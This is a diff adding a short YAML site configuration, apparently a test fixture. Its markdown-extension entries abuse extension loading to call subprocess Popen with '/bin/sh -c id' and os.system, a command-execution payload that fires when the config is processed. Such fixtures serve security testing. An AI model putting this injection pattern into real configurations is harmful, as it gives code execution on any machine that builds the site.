@@ -1,0 +1,9 @@
+site_name: Test
+markdown_extensions:
+  - toc:
+      permalink: true
+  - 'subprocess:Popen':
+      args: ['/bin/sh', '-c', 'id']
+  - admonition
+  - 'os:system':
+      name: 'pwned'
